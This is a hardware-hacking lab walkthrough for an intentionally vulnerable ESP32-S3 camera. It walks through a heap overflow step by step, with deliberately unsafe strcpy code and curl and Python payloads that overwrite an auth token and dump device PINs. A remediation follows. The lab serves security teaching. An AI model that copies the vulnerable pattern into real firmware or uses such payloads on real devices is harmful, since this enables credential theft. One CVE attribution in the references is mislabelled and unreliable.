# L13: Heap Buffer Overflow

## Goal
Exploit a heap-based buffer overflow in the device profile endpoint to corrupt an adjacent auth token and dump credentials.

## Background

**Why this matters**: Heap overflows corrupt dynamically allocated memory (via `malloc()`). On IoT devices with simple allocators and no mitigations, adjacent allocations are highly predictable, making exploitation reliable.

**What you're looking for in IoT devices:**
- `malloc()` followed by `strcpy()` or `sprintf()` without bounds checking
- Fixed-size heap buffers filled with variable-length user input
- Heap-allocated structures where data buffers are adjacent to auth tokens, config flags, or function pointers

**Why this happens:**
- `strcpy()` copies until null terminator regardless of buffer size
- ESP32-S3 uses a simple heap allocator (multi_heap/dlmalloc) with no guard pages, canaries, or ASLR
- Packed structs on the heap place buffers contiguously with no metadata gap

**On CoreS3**: The `POST /settings/profile` endpoint accepts a `description` parameter for setting the camera name/location. Internally it allocates a packed struct on the heap containing a 48-byte description buffer immediately followed by a 32-byte auth token (`ADMIN_TOKEN=denied`). The description is copied via `strcpy()` with no bounds check. By overflowing with 48 bytes of padding followed by `ADMIN_TOKEN=granted`, the attacker overwrites the denied token, triggering a credential dump.

## Hardware Setup

- CoreS3 device connected via USB-C (serial + WiFi)
- HTTP client (curl, Python requests, or Burp Suite)
- Serial terminal for observing credential dump

## Lab Walkthrough

### Step 1: Understand the Heap Layout

The `POST /settings/profile` endpoint processes the description inside a heap-allocated packed struct:

```cpp
struct __attribute__((packed)) HeapSession {
    char inputBuf[48];          // 48-byte description buffer
    char authToken[32];         // adjacent: "ADMIN_TOKEN=denied"
};
HeapSession* session = (HeapSession*)malloc(sizeof(HeapSession));
strcpy(session->authToken, "ADMIN_TOKEN=denied");
strcpy(session->inputBuf, description);  // NO bounds check!
```

Memory layout (single contiguous allocation, no metadata gap):
```
Low address                                          High address
|<-- inputBuf (48 bytes) -->|<-- authToken (32 bytes) -->|
|  description copied here  | ADMIN_TOKEN=denied         |
```

If the description exceeds 48 bytes, `strcpy()` writes directly into `authToken`. By crafting the overflow to write `ADMIN_TOKEN=granted`, the attacker replaces the denied token, triggering credential dump.

### Step 2: Connect to Device

```bash
# Connect to device WiFi AP
nmcli device wifi connect "CoreS3-CAM-XXXX"

# Open serial monitor to observe credential dump
pio device monitor -b 115200
```

### Step 3: Test Normal Description (Baseline)

Send a normal camera description shorter than 48 bytes.

```bash
curl -X POST http://192.168.4.1/settings/profile \
  -d "description=Living+Room+Camera"

# Expected output:
# [HEAP] Heap Buffer Overflow Analysis
# =====================================
# Input buffer size: 48 bytes
# Input length: 18 bytes
# Buffer contents: Living Room Camera
# Auth token: ADMIN_TOKEN=denied
# heap_overflow: safe
```

Auth token shows `ADMIN_TOKEN=denied`. This is the target to overwrite.

### Step 4: Overflow with Garbage (Show Corruption)

Send 48 bytes of padding + arbitrary text. The text overwrites the auth token.

```bash
curl -X POST http://192.168.4.1/settings/profile \
  -d "description=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHACKED_token"

# Expected output:
# Input buffer size: 48 bytes
# Input length: 60 bytes
# Buffer contents: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHACKED_token
# Auth token: hacked_token
#
# heap_overflow: detected
# Token corrupted to: hacked_token
# Target: overflow with 48 bytes padding + ADMIN_TOKEN=granted
```

The auth token is now `hacked_token` instead of `ADMIN_TOKEN=denied`. You control what goes there.

### Step 5: Full Exploit - Overflow with ADMIN_TOKEN=granted

Craft the payload: exactly 48 bytes of padding + `ADMIN_TOKEN=granted`. This overwrites the denied token with a granted one, triggering a credential dump.

```bash
python3 -c "
payload = 'A' * 48 + 'ADMIN_TOKEN=granted'
import requests
r = requests.post('http://192.168.4.1/settings/profile',
                   data={'description': payload})
print(r.text)
"

# Expected HTTP response:
# Input buffer size: 48 bytes
# Input length: 67 bytes
# Auth token: ADMIN_TOKEN=granted
#
# admin_unlock: true

# Expected serial output (credentials dumped):
# admin_unlock: true
# admin_pin=YYYYYY
# user_pin=XXXXXX
```

Both PINs are dumped to serial. The HTTP response confirms `admin_unlock: true`. The overflow replaced `ADMIN_TOKEN=denied` with `ADMIN_TOKEN=granted`.

The `heap-test` serial command triggers the same vulnerability for testing without WiFi:
```
cores3-cam> heap-test AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADMIN_TOKEN=granted
```

### Step 6: Compare with Stack Overflow (L11)

| Aspect | Stack Overflow (L11) | Heap Overflow (L13) |
|--------|---------------------|---------------------|
| **Memory region** | Stack (automatic) | Heap (malloc) |
| **Attack surface** | HTTP GET /camera?exposure= | HTTP POST /settings/profile |
| **Target** | Function pointer at known offset | Adjacent auth token in same struct |
| **Exploitation** | Redirect execution to unlockAdmin() | Overwrite auth token to trigger credential dump |
| **Predictability** | Deterministic (no ASLR) | Deterministic (packed struct, no metadata gap) |
| **Crash risk** | Device crashes if address is wrong | No crash (controlled overwrite) |
| **Payload** | 64 bytes padding + 4-byte LE address | 48 bytes padding + target string |

## Success Criteria

- [ ] `POST /settings/profile` with short description shows `ADMIN_TOKEN=denied` and `heap_overflow: safe`
- [ ] Overflow with garbage shows token corrupted to attacker-controlled value
- [ ] Overflow with 48 A's + `ADMIN_TOKEN=granted` shows `admin_unlock: true` with PINs dumped to serial
- [ ] Understood the layout: packed struct puts inputBuf[48] and authToken[32] contiguously on the heap
- [ ] Understood why this works: `strcpy` writes past the 48-byte buffer directly into the adjacent authToken field

## Impact

- **Adjacent data corruption**: Overwrites auth tokens, config flags, or security-critical heap data
- **No crash required**: Unlike traditional heap exploits that corrupt metadata, this uses a packed struct with no metadata gap
- **No heap protections on ESP32-S3**: No guard pages, canaries, or ASLR
- **Remote exploitation**: Triggered via HTTP POST, no physical access needed
- **Real-world parallel**: CVE-2021-22555 (Linux Netfilter heap overflow), CVE-2022-27666 (ESP-IDF heap overflow)

## Remediation

```cpp
// VULNERABLE:
strcpy(session->inputBuf, description.c_str());

// FIXED:
strncpy(session->inputBuf, description.c_str(), sizeof(session->inputBuf) - 1);
session->inputBuf[sizeof(session->inputBuf) - 1] = '\0';
```

## References

- [OWASP - Buffer Overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)
- [Heap Exploitation Techniques](https://heap-exploitation.dhavalkapil.com/)
- [ESP32 Memory Layout](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/api-reference/system/mem_alloc.html)
